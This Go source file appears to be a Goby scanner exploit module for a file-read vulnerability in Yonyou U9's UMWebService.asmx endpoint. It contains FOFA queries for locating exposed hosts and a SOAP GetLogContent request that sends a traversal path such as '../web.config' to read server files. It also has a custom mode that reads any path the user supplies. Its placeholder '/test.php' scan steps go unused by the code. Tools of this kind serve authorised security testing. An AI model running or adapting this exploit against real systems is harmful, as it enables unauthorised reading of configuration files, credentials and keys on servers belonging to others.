package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "YonyouU9 UMWebService.asmx File Read Vulnerability",
    "Description": "<p>U9 Cloud focuses on medium and large manufacturing enterprises, fully supporting integrated scenarios such as business-finance-tax-archive integration, design-manufacturing integration, planning-execution integration, marketing-service integration, and project-manufacturing integration within the smart manufacturing domain. It empowers organizational transformation and business innovation by integrating industrial internet resources to achieve connectivity, sharing, and collaboration, thereby facilitating the high-quality development of manufacturing enterprises.</p>",
    "Product": "yonyou-U9",
    "Homepage": "https://u9cloud.yonyou.com/about/about",
    "DisclosureDate": "2024-08-09",
    "PostTime": "2024-08-09",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"logo-u9.png\" || (body=\"/images/u9-work-mobile.png\" && body=\"用友\")",
    "GobyQuery": "body=\"logo-u9.png\" || (body=\"/images/u9-work-mobile.png\" && body=\"用友\")",
    "Level": "1",
    "Impact": "<p>Attackers may gain access to sensitive data on the server, such as user passwords, configuration files, API keys, etc., leading to further system compromise.</p>",
    "Recommendation": "<p>Implement strict path controls to ensure the application can only access authorized directories. This can be achieved by adding whitelisting in the code, using file path normalization, or setting file system permissions to prevent unauthorized file reading.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "用友U9 UMWebService.asmx 文件读取漏洞",
            "Product": "yonyou-U9",
            "Description": "<p>U9 cloud聚焦中型和中大型制造企业，全面支持业财税档一体化、设计制造一体化、计划执行一体化、营销服务一体化、项目制造一体化等数智制造场景，赋能组织变革和商业创新，融合产业互联网资源实现连接、共享、协同，助力制造企业高质量发展。<br></p>",
            "Recommendation": "<p>实施严格的路径控制，确保应用程序只能访问允许的文件目录。可以通过在代码中添加白名单、使用文件路径的规范化或设置文件系统权限来防止未经授权的文件读取<br></p>",
            "Impact": "<p>攻击者可以获取到服务器上的敏感数据，如用户密码、配置文件、API密钥等，从而进一步入侵系统。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "YonyouU9 UMWebService.asmx File Read Vulnerability",
            "Product": "yonyou-U9",
            "Description": "<p>U9 Cloud focuses on medium and large manufacturing enterprises, fully supporting integrated scenarios such as business-finance-tax-archive integration, design-manufacturing integration, planning-execution integration, marketing-service integration, and project-manufacturing integration within the smart manufacturing domain. It empowers organizational transformation and business innovation by integrating industrial internet resources to achieve connectivity, sharing, and collaboration, thereby facilitating the high-quality development of manufacturing enterprises.<br></p>",
            "Recommendation": "<p>Implement strict path controls to ensure the application can only access authorized directories. This can be achieved by adding whitelisting in the code, using file path normalization, or setting file system permissions to prevent unauthorized file reading.<br></p>",
            "Impact": "<p>Attackers may gain access to sensitive data on the server, such as user passwords, configuration files, API keys, etc., leading to further system compromise.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9933"
}`

	postOrGet_piddkjjvldsfldd := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {

		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36",
			"Content-Type": "text/xml; charset=utf-8",
			"SOAPAction":   "\"http://tempuri.org/GetLogContent\"",
		}
		path := "/u9/OnLine/UMWebService.asmx"
		body := "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetLogContent xmlns=\"http://tempuri.org/\">\n      <fileName>" + fileUrl + "</fileName>\n    </GetLogContent>\n  </soap:Body>\n</soap:Envelope>"
		resp, err := setPostRequest(hostInfo, path, body, header)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/u9/OnLine/UMWebService.asmx"

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"../web.config": "<GetLogContentResponse xmlns=\"http://tempuri.org/\"><GetLogContentResult>",
			}

			// 函数继承

			uploadFileFunc := postOrGet_piddkjjvldsfldd

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"config": {"../web.config", "<GetLogContentResponse xmlns=\"http://tempuri.org/\"><GetLogContentResult>"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_piddkjjvldsfldd

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Customize"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true
			expResult.Output = resp
			return expResult

		},
	))
}
